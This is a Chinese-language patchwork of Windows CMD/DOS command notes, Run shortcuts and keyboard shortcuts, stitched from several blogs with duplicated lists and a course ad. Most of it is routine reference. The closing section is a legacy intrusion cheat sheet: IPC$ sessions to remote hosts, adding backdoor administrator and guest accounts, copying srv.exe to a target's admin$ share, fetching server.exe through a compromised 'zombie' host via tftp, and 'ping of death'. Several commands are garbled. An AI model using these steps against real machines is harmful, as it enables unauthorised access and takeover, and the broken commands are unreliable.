cmd是command的缩写.即命令行 。

虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows 的各种版本都与其兼容，用户可以在Windows 系统下运行DOS，中文版Windows XP中的命令提示符进一步提高了与DOS下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。

作为一个开发者，我们用的最多的就是windows，但是对于cmd，我不知道大家熟不熟，反正我是一直不怎么熟悉。平时操作linux比较多，反而忽视了cmd相关命令，这里大致总结一些常用的命令，作为记录。

1. 常用命令
1.1 cd命令

//进入d盘
D:
//进入F盘
F:


cd /?     //获取使用帮助

cd \       //跳转到硬盘的根目录

cd C:\WINDOWS  //跳转到当前硬盘的其他文件

d:        //跳转到其他硬盘

cd /d e:\software    //跳转到其他硬盘的其他文件夹，注意此处必须加/d参数。否则无法跳转。

cd..      //跳转到上一层目录
1.2 查看目录文件

//查看当前目录下的文件，类似于linux下的ls
dir

如果是需要查看隐藏文件的或者更多操作的话，可以使用dir /?来查看其它用法，cmd这点挺好的。

python /? 

1.3 创建目录和删除目录

//创建目录
md 目录名（文件夹）
//删除目录
rd 目录名（文件夹）
1.4 查看本机ip

ipconfig
1.5 清除屏幕

cls
类似于linux下的clear

1.6 复制文件

copy 路径\文件名 路径\文件名 ：把一个文件拷贝到另一个地方。
1.7 移动文件

move 路径\文件名 路径\文件名 ：把一个文件移动（就是剪切+复制）到另一个地方。
1.8 删除文件

//这个是专门删除文件的，不能删除文件夹
del 文件名
1.9 ping

//用来测试网络是否畅通
ping ip(主机名)
1.10 taskkill

列出所有任务及进程号，杀进程

taskkill

taskkill /?  获取使用帮助
taskkill是用来终止进程的。具体的命令规则如下：

TASKKILL [/S system [/U username [/P [password]]]]
{ [/FI filter] [/PID processid | /IM imagename] } [/F] [/T]
描述:

这个命令行工具可用来结束至少一个进程。

可以根据进程 id 或映像名（Image）来结束进程。

参数列表:

/S system 指定要连接到的远程系统。
/U [domain\]user 指定应该在哪个用户上下文
执行这个命令:

/P [password] 为提供的用户上下文指定密码。如果忽略，提示输入。
/F 指定要强行终止的进程。
/FI filter 指定筛选进或筛选出查询的的任务。
/PID process id 指定要终止的进程的PID。
/IM image name 指定要终止的进程的映像名称。通配符 '*'可用来指定所有映像名。
/T Tree kill: 终止指定的进程和任何由此启动的子进程。
/? 显示帮助/用法。
例如:

TASKKILL /S system /F /IM notepad.exe /T
TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
TASKKILL /F /IM QQ.exe
TASKKILL /F /IM notepad.exe /IM mspaint.exe
TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
TASKKILL /F /FI "USERNAME eq NT AUTHORITY\SYSTEM" /IM notepad.exe 

1.11 netstat 查看网络连接状态

显示协议统计信息和当前 TCP/IP 网络连接。该命令可以查看当前机器建立的所有网络链接状态，以及对应哪个进程。

netstat -help 获取命令行使用帮助信息

netstat -ano  //查看网络连接、状态以及对应的进程id
语法：

netstat [选项]
参数：

-a或--all：显示所有连线中的Socket；
-A<网络类型>或--<网络类型>：列出该网络类型连线中的相关地址；
-c或--continuous：持续列出网络状态；
-C或--cache：显示路由器配置的快取信息；
-e或--extend：显示网络其他相关信息；
-F或--fib：显示FIB；
-g或--groups：显示多重广播功能群组组员名单；
-h或--help：在线帮助；
-i或--interfaces：显示网络界面信息表单；
-l或--listening：显示监控中的服务器的Socket；
-M或--masquerade：显示伪装的网络连线；
-n或--numeric：直接使用ip地址，而不通过域名服务器；
-N或--netlink或--symbolic：显示网络硬件外围设备的符号连接名称；
-o或--timers：显示计时器；
-p或--programs：显示正在使用Socket的程序识别码和程序名称；
-r或--route：显示Routing Table；
-s或--statistice：显示网络工作信息统计表；
-t或--tcp：显示TCP传输协议的连线状况；
-u或--udp：显示UDP传输协议的连线状况；
-v或--verbose：显示指令执行过程；
-V或--version：显示版本信息；
-w或--raw：显示RAW传输协议的连线状况；
-x或--unix：此参数的效果和指定"-A unix"参数相同；
--ip或--inet：此参数的效果和指定"-A inet"参数相同。
1.12 find

find /？获取使用帮助

netstat -ano|find ".8"   //使用管道符，进行模糊查询
1.13 tracert

tracert也被称为Windows路由跟踪实用程序，在命令提示符（cmd）中使用tracert命令可以用于确定IP数据包访问目标时所选择的路径。

tracert /? 获取使用帮助
2. 查看cmd下的命令
1、使用help命令，查看所有的dos命令

使用这个命令之后，我们可以看到所有的dos命令，并且后面还有中文的解释。简直不要太赞，这样我们就可以根据自己的需求要找到想要使用的命令。

2、找到命令之后，使用 命令+ /?来查看该命令下的其他属性

命令 -help    //第1种形式的使用帮助

命令  /?       //第2种形式的使用帮助
注意：这些字符只能是英文的

3. 辅助符号或命令
3.1 ‘|’

“|”cmd命令中|代表前一个的输出代表后一个的输入

查找特定ip的网络连接及进程号：netstat -ano|find "192.168.1.10"



3.2 重定向输出符号> >>

将原本输出到命令窗口的内容，转存到文件中，如jstack 12912 >d:/s.txt 打印线程到指定文件

cmd > 重定向输出并覆盖源文件。

例如

echo hello >c:\1.txt  // 1.txt的文件内容先被清空，然后写入hello。
cmd >>重定向输出追加到文件末尾

例如：

echo hello >>c:\1.txt  // 在1.txt文件末尾加上hello
3.3 重定向输入符号< <<

cmd < file
使cmd命令从file读入

cmd << text
从命令行读取输入，直到一个与text相同的行结束。

除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。

如果使用 <<- ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考后面的例子。

cmd <<< word
把word（而不是文件word）和后面的换行作为输入提供给cmd。

cmd <> file
以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。

cmd >| file
功能同>，但即便在设置了noclobber时也会覆盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用>!实现这一功能。

3.4 终止一直在运行的命令ctrl+c

有时某个命令一直打印输出结果(如ping 192.168.1.10 -t)，我们想终止这个命令的执行，直接按ctrl+c即可。

3.5 清空cmd窗口内容命令cls

有时cmd内容太多，滚动费尽，需要清空屏幕内容，直接输入cls即可

cmd命令中，按键盘的向上箭头可以直接复制前一个命令

3.6 常用工具

Process Explorer，查询进程的详细信息，如查询java进程启动参数，运行环境，线程信息、网络连接信息、使用了哪些dll，打开了什么句柄。包含注册表、Socket、文件等等。

下载地址：Process Explorer - Windows Sysinternals

4. 附加一些Windows下的快捷键
win+E                 打开文件管器

win+D                 显示桌面

win+L                 锁计算机

alt+F4                 关闭当前程序

ctrl+shift+Esc    打开任务管理器（或者ctrl+alt+delete）

ctrl+F                  在一个文本或者网页里面查找，相当实用（退出一般按ESC）

ctrl+A                  选中所有文本


学习更多编程基础知识推荐以下教学视频

尚学堂给同学们带来全新的Java300集课程啦!java零基础小白自学Java必备优质教程_手把手图解学习Java，让学习成为一种享受_哔哩哔哩_bilibili 






cmd------CMD命令提示符
MSConfig------系统配置实用程序
regedit------注册表编辑器
notepad------打开记事本
calc------启动计算器
mstsc------远程桌面连接
services.msc------系统服务
gpedit.msc------组策略
shutdown------60秒倒计时关机命令
Nslookup-------IP地址侦测器
explorer------打开资源管理器
chkdsk.exe------Chkdsk磁盘检查
dcomcnfg------打开系统组件服务
devmgmt.msc------设备管理器
cleanmgr------垃圾整理
compmgmt.msc------计算机管理
secpol.msc------本地安全策略
netstat -an------(TC)命令检查接口
taskmgr------任务管理器
mmc------打开控制台
logoff------注销命令
lusrmgr.msc------本机用户和组
dvdplay------DVD播放器
diskmgmt.msc------磁盘管理实用程序
dxdiag------检查DirectX信息
perfmon.msc------计算机性能检测程序
winver------检测Windows版本
write------写字板
wiaacmgr------扫描仪和照相机向导
mspaint------画图板
magnify------放大镜实用程序
utilman------辅助工具管理器
osk------打开屏幕键盘
odbcad32------ODBC数据源管理器
Sndvol32或Sndvol------音量控制程序
sfc.exe------系统文件检查器
sfc /scannow------Windows文件保护
eventvwr------事件查看器
cliconfg------SQL Server客户端网络实用程序
certmgr.msc------证书管理实用程序
使用 Win键+其他键组合：
Win键：打开“开始”菜单
Win键+E：打开我的电脑
Win键+R：打开运行对话框
Win键+D：显示桌面
Win键+M：最小化所有窗口
Win键+X：Windows移动中心，调节音量，屏幕亮度
Win键+Home：除了正在选择的窗口，其他窗口最小化
Win键+PAUSE BREAK：打开“系统属性”对话框
Win键+【+/-】：打开Windows放大、缩小功能
Win键+Pause：显示系统属性对话框
Win键+TAB：Aero三维效果切换程序
Win键+数字键：让位于任务栏上的程序打开（数字为序号）
Win键+P：选择一个演示文稿显示模式，可以用来关闭屏幕
Win键+L：锁定计算机，需要输入密码或者选择其他用户
Win键+T：多次按可以在多个程序间顺序切换
Win键+F：计算机搜索，可以搜索计算机里面所有文件
Win键+【←/→】：在屏幕左/右半个屏幕最大化
Win键+【↑/↓】：最大化/最小化







条件：

远程计算机的用户设有密码。

命令：

1.建立非空连接

net use \\192.168.1.16\ipc$"密码" /user:"用户名"

（记得把IP换成要目标计算机IP，空格位置已标出）

2.关机命令

shutdown -s -m 192.168.1.16 -t 5

（-s 关机；-r 重启；-m 192.168.1.16 指定目标计算机；-t 5 指定倒计时时间为5秒）

win10自动登录功能设置

1.运行窗口输入：netplwiz

2.取消勾选“要使用本计算机，……”，点击应用，在弹出窗口输入密码确认即可
————————————————
版权声明：本文为CSDN博主「此花亭」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_25915701/article/details/121432430





开启remote registry服务
如果您想远程关闭或重新启动PC，您可以从配置本地网络中的每台计算机。默认情况下，remote registry服务被禁用，请按照下面的步骤来启用它。
1.在你想要远程操作的计算机上，点击左下角的开始按钮，然后在搜索栏输入services.msc，在结果中找到“服务”，鼠标右键单击它，在弹出的菜单选择“以管理员身份运行”。

2.在列表中找到Remote Registry，鼠标右键单击并选择属性。

3.在弹出的窗口中，找到启动类型，然后修改启动类型为“自动”，修改完点击确定即可。

4.接下来要配置一下防火墙，同样点击左下角的开始按钮搜索“允许应用通过防火墙”，单击匹配的结果。

5.在弹出的窗口中点击右上角的“更改设置”，然后找到“Windows Management Instrumentation (WMI)”并启用它，最后点击确认关闭窗口即可。

如何远程关机
要关闭您的Windows 10计算机，请执行以下步骤:
1. 点击左下角的开始按钮，输入cmd，找到命令提示符，右键单击它并选择“以管理员身份运行”。

2.进入命令提示符后，输入如下命令：
shutdown /i
3.在“远程关机对话框“中，添加一个或多个电脑名称，并指定要关闭还是重新启动。您还可以选择警告用户并将消息记录到事件日志中。

注意:您可以到相应的计算机上通过右键单击桌面上的”此电脑“图标并在弹出的菜单选择”属性“来查看它的名称。
使用命令行
这种方法需要您调整注册表设置来关闭或重新启动您的Windows 10计算机。您需要小心地遵循这些步骤，因为注册表中的任何错误配置都会破坏系统的稳定。
请遵循以下步骤:
1.右键单击左下角的开始按钮，然后选择”运行“，输入regedit并按回车键，进入注册表编辑器。
2.导航到:“计算机\HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System”。
3.右键单击System文件夹。选择“新建->DWORD(32位)值”，输入名字”LocalAccountTokenFilterPolicy“，双击该值将其更改为“1”。
4.关闭并退出注册表。重新启动计算机以确认更改。
5.接下来按照前面的步骤以管理员身份进入命令提示符。在命令提示符窗口，使用net命令登录计算机。例如:net use \\MachineName，然后按回车键。此时一般会提示输入账号密码，输入对应计算机的账号密码即可。
6.输入下面的命令并按回车。
shutdown –r –m \\MachineName –t -01
如果前面配置的没错，根据您选择的参数，远程计算机应该自动关闭或重新启动。
您也可以为这些进程指定更长的周期，为了确保它关闭或重新启动，请按如下方式添加/f切换到命令行:
shutdown /m \\ MachineName/r /f
关闭远程计算机上任何正在运行的应用程序。
批量关机或重启
当您希望每天同一时间远程关闭或重启Windows 10多台计算机时，此方法会有所帮助。
虽然使用命令行比较方便，但如果每次都必须重复输入命令会很麻烦。我们可以使用更简单的方法来自动关闭和/或重启所有Windows 10电脑。
请参考下面的方法:
1. 运行记事本.
2.输入远程关机和/或重启每台计算机的命令。例如:
shutdown –r –m \\pcwanjia-pc1 t -01shutdown –r –m \\pcwanjia-pc2 -t -01
将文件保存为.bat格式。例如shutdownrestart.bat，每次需要关机或者重启的时候双击这个bat文件即可自动完成所有的工作。





测CPU：象棋测试、Super PI、wPrime、Cinebench等测显卡(理论性能)：Luxmark、AIDA64测显卡(实际性能)：3Dmark(系列)、SPECviewPerf(系列)测硬盘：HD Tune、AS SSD、ATTO之类的测屏幕：校色仪温度测试：AIDA64和HWinfo64是较好的温度、频率监测软件，各项数据都很详细，后者还有数据记录功能。

作者：青胜软件测试
链接：https://www.zhihu.com/question/541992313/answer/2562624652
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。



1. appwiz.cpl：程序和功能

2. calc：启动计算器

3. certmgr.msc：证书管理实用程序

4. charmap：启动字符映射表

5. chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）

6. cleanmgr: 打开磁盘清理工具

7. cliconfg：SQL SERVER 客户端网络实用工具

8. cmstp：连接管理器配置文件安装程序

9. cmd.exe：CMD命令提示符

10. 自动关机命令

Shutdown -s -t 600：表示600秒后自动关机

shutdown -a ：可取消定时关机

Shutdown -r -t 600：表示600秒后自动重启

rundll32 user32.dll,LockWorkStation：表示锁定计算机

11. colorcpl：颜色管理，配置显示器和打印机等中的色彩

12. CompMgmtLauncher：计算机管理

13. compmgmt.msc：计算机管理

14. credwiz：备份或还原储存的用户名和密码

15. comexp.msc：打开系统组件服务

16. control：控制面版

17. dcomcnfg：打开系统组件服务

18. Dccw：显示颜色校准

19. devmgmt.msc：设备管理器

20. desk.cpl：屏幕分辨率

21. dfrgui：优化驱动器  Windows 7→dfrg.msc：磁盘碎片整理程序

22. dialer：电话拨号程序

23. diskmgmt.msc：磁盘管理

24. dvdplay：DVD播放器

25. dxdiag：检查DirectX信息

26. eudcedit：造字程序

27. eventvwr：事件查看器

28. explorer：打开资源管理器

29. Firewall.cpl：Windows防火墙

30. FXSCOVER：传真封面编辑器

31. fsmgmt.msc：共享文件夹管理器

32. gpedit.msc：组策略

33. hdwwiz.cpl：设备管理器

34. inetcpl.cpl：Internet属性

35. intl.cpl：区域

36. iexpress：木马捆绑工具，系统自带

37. joy.cpl：游戏控制器

38. logoff：注销命令

39. lusrmgr.msc：本地用户和组

40. lpksetup：语言包安装/删除向导，安装向导会提示下载语言包

41. lusrmgr.msc：本机用户和组

42. main.cpl：鼠标属性

43. mmsys.cpl：声音

44. magnify：放大镜实用程序

45. mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe>d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）

46. MdSched:Windows内存诊断程序

47. mmc：打开控制台

48. mobsync：同步命令

49. mplayer2：简易widnows media player

50. Msconfig.exe：系统配置实用程序

51. msdt：微软支持诊断工具

52. msinfo32：系统信息

53. mspaint：画图

54. Msra：Windows远程协助

55. mstsc：远程桌面连接

56. NAPCLCFG.MSC：客户端配置

57. ncpa.cpl：网络连接

58. narrator：屏幕“讲述人”

59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项

60. netstat : an(TC)命令检查接口

61. notepad：打开记事本

62. Nslookup：IP地址侦测器

63. odbcad32：ODBC数据源管理器

64. OptionalFeatures：打开“打开或关闭Windows功能”对话框

65. osk：打开屏幕键盘

66. perfmon.msc：计算机性能监测器

67. perfmon：计算机性能监测器

68. PowerShell：提供强大远程处理能力

69. printmanagement.msc：打印管理

70. powercfg.cpl：电源选项

71. psr：问题步骤记录器

72. Rasphone：网络连接

73. Recdisc：创建系统修复光盘

74. Resmon：资源监视器

75. Rstrui：系统还原

76. regedit.exe：注册表

77. regedt32：注册表编辑器

78. rsop.msc：组策略结果集

79. sdclt：备份状态与配置，就是查看系统是否已备份

80. secpol.msc：本地安全策略

81. services.msc：本地服务设置

82. sfc /scannow：扫描错误并复原/windows文件保护

83. sfc.exe：系统文件检查器

84. shrpubw：创建共享文件夹

85. sigverif：文件签名验证程序

86. slui：Windows激活，查看系统激活信息

87. slmgr.vbs -dlv ：显示详细的许可证信息

slmgr.vbs -dli ：显示许可证信息

slmgr.vbs -xpr ：当前许可证截止日期

slmgr.vbs -dti ：显示安装ID 以进行脱机激

slmgr.vbs -ipk ：(Product Key)安装产品密钥

slmgr.vbs -ato ：激活Windows

slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）

slmgr.vbs -ilc ：(License file)安装许可证

slmgr.vbs -upk ：卸载产品密钥

slmgr.vbs -skms ：(name[ort] )批量授权

88. snippingtool：截图工具，支持无规则截图

89. soundrecorder：录音机，没有录音时间的限制

90. StikyNot：便笺

91. sysdm.cpl：系统属性

92. sysedit：系统配置编辑器

93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码

94. taskmgr：任务管理器（旧版）

95. TM任务管理器（新版）

96. taskschd.msc：任务计划程序

97. timedate.cpl：日期和时间

98. UserAccountControlSettings用户账户控制设置

99. utilman：辅助工具管理器

100. wf.msc：高级安全Windows防火墙

101. WFS：Windows传真和扫描

102. wiaacmgr：扫描仪和照相机向导

103. winver：关于Windows

104. wmimgmt.msc：打开windows管理体系结构(WMI)

105. write：写字板

106. wscui.cpl：操作中心

107. wscript：windows脚本宿主设置

108. wuapp：Windows更新

1. gpedit.msc-----组策略

2. sndrec32-------录音机

3. Nslookup-------IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。

4. explorer-------打开资源管理器

5. logoff---------注销命令

6. shutdown-------60秒倒计时关机命令

7. lusrmgr.msc----本机用户和组

8. services.msc---本地服务设置

9. oobe/msoobe /a----检查XP是否激活

10. notepad--------打开记事本

11. cleanmgr-------垃圾整理

12. net start messenger----开始信使服务

13. compmgmt.msc---计算机管理

14. net stop messenger-----停止信使服务

15. conf-----------启动netmeeting

16. dvdplay--------DVD播放器

17. charmap--------启动字符映射表

18. diskmgmt.msc---磁盘管理实用程序

19. calc-----------启动计算器

20. dfrg.msc-------磁盘碎片整理程序

21. chkdsk.exe-----Chkdsk磁盘检查

22. devmgmt.msc--- 设备管理器

23. regsvr32 /u *.dll----停止dll文件运行

24. drwtsn32------ 系统医生

25. rononce -p----15秒关机

26. dxdiag---------检查DirectX信息

27. regedt32-------注册表编辑器

28. Msconfig.exe---系统配置实用程序

29. rsop.msc-------组策略结果集

30. mem.exe--------显示内存使用情况

31. regedit.exe----注册表

32. winchat--------XP自带局域网聊天

33. progman--------程序管理器

34. winmsd---------系统信息

35. perfmon.msc----计算机性能监测程序

36. winver---------检查Windows版本

37. sfc /scannow-----扫描错误并复原

38. taskmgr-----任务管理器（2000/xp/2003

39. winver---------检查Windows版本

40. wmimgmt.msc----打开windows管理体系结构(WMI)

41. wupdmgr--------windows更新程序

42. wscript--------windows脚本宿主设置

43. write----------写字板

44. winmsd---------系统信息

45. wiaacmgr-------扫描仪和照相机向导

46. winchat--------XP自带局域网聊天

47. mem.exe--------显示内存使用情况

48. Msconfig.exe---系统配置实用程序

49. mplayer2-------简易widnows media player

50. mspaint--------画图板

51. mstsc----------远程桌面连接

52. mplayer2-------媒体播放机

53. magnify--------放大镜实用程序

54. mmc------------打开控制台

55. mobsync--------同步命令

56. dxdiag---------检查DirectX信息

57. iexpress-------木马捆绑工具，系统自带 58. fsmgmt.msc-----共享文件夹管理器

59. utilman--------辅助工具管理器

60. diskmgmt.msc---磁盘管理实用程序

61. dcomcnfg-------打开系统组件服务

62. ddeshare-------打开DDE共享设置

110. osk------------打开屏幕键盘

111. odbcad32-------ODBC数据源管理器

112. oobe/msoobe /a----检查XP是否激活 114. logoff---------注销命令

66. notepad--------打开记事本

67. nslookup-------网络管理的工具向导

68. ntbackup-------系统备份和还原

69. narrator-------屏幕“讲述人”

70. ntmsmgr.msc----移动存储管理器

71. ntmsoprq.msc---移动存储管理员操作请求

72. netstat -an----(TC)命令检查接口

73. syncapp--------创建一个公文包

74. sysedit--------系统配置编辑器

75. sigverif-------文件签名验证程序

76. ciadv.msc------索引服务程序

77. shrpubw--------创建共享文件夹

78. secpol.msc-----本地安全策略

79. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码

80. services.msc---本地服务设置

81. Sndvol32-------音量控制程序

82. sfc.exe--------系统文件检查器

83. sfc /scannow---windows文件保护

84. ciadv.msc------索引服务程序

85. tourstart------xp简介（安装完成后出现的漫游xp程序）

86. taskmgr--------任务管理器

87. eventvwr-------事件查看器

88. eudcedit-------造字程序

89. compmgmt.msc---计算机管理

90. packager-------对象包装程序

91. perfmon.msc----计算机性能监测程序

92. charmap--------启动字符映射表

93. cliconfg-------SQL SERVER 客户端网络实用程序

94. Clipbrd--------剪贴板查看器

95. conf-----------启动netmeeting

96. certmgr.msc----证书管理实用程序

97. regsvr32 /u *.dll----停止dll文件运行

98. regsvr32 /u zipfldr.dll------取消ZIP支持

99. cmd.exe--------CMD命令提示符

100. chkdsk.exe-----Chkdsk磁盘检查

1.磁盘操作，

fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录

fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）

format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest

2.目录操作

DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置

MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录

CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹

RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录

3.文件操作

删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除C盘的qqdownload目录。

del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认

del c:\del /s /q 自动删除c盘的del目录。

copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98\*.* c:\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。

attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。

4.内存操作

debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01

[return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。

5.分区操作

给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。

PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。

net use ipipc$ " " /user:" " 建立IPC空链接

net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接

net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:

net use h: ipc$ 登陆后映射对方C：到本地为H:

net use ipipc$ /del 删除IPC链接

net use h: /del 删除映射对方到本地的为H:的映射

net user 用户名　密码　/add 建立用户

net user guest /active:yes 激活guest用户

net user 查看有哪些用户

net user 帐户名 查看帐户的属性

net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限

net start 查看开启了哪些服务

net start 服务名　开启服务；(如:net start telnet， net start schedule)

net stop 服务名 停止某服务

net time 目标ip 查看对方时间

net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息

net view 查看本地局域网内开启了哪些共享

net view ip 查看对方局域网内开启了哪些共享

net config 显示系统网络设置

net logoff 断开连接的共享

net pause 服务名 暂停某服务

net send ip "文本信息" 向对方发信息

net ver 局域网内正在使用的网络连接类型和信息

net share 查看本地开启的共享

net share ipc$ 开启ipc$共享

net share ipc$ /del 删除ipc$共享

net share c$ /del 删除C：共享

net user guest 12345 用guest用户登陆后用将密码改为12345

net password 密码 更改系统登陆密码

netstat -a 查看开启了哪些端口,常用netstat -an

netstat -n 查看端口的网络连接情况，常用netstat -an

netstat -v 查看正在进行的工作

netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况

netstat -s 查看正在使用的所有协议使用情况

nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名

tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。

ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。

ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)

ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息

tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)

del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件

del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）

move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖

fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令

at id号 开启已注册的某个计划任务

at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止

at id号 /delete 停止某个已注册的计划任务

at 查看所有的计划任务

at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机

finger username @host 查看最近有哪些用户登陆

telnet ip 端口 远和登陆服务器,默认端口为23

open ip 连接到IP（属telnet登陆后的命令）

telnet 在本机上直接键入telnet 将进入本机的telnet

copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件

copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下

copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件

copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：

xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件

用参数/e才可连目录下的子目录一起复制到目标地址下。

tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送

tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机

ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)

route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface

arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息

start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令

mem 查看cpu使用情况

attrib 文件名(目录名) 查看某文件（目录）的属性

attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性

dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间

date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间

set 指定环境变量名称=要指派给变量的字符 设置环境变量

set 显示当前所有的环境变量

set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量

pause 暂停批处理程序，并显示出：请按任意键继续....

if 在批处理程序中执行条件处理（更多说明见if命令及变量）

goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）

call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）

for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）

echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置

echo 信息 在屏幕上显示出信息
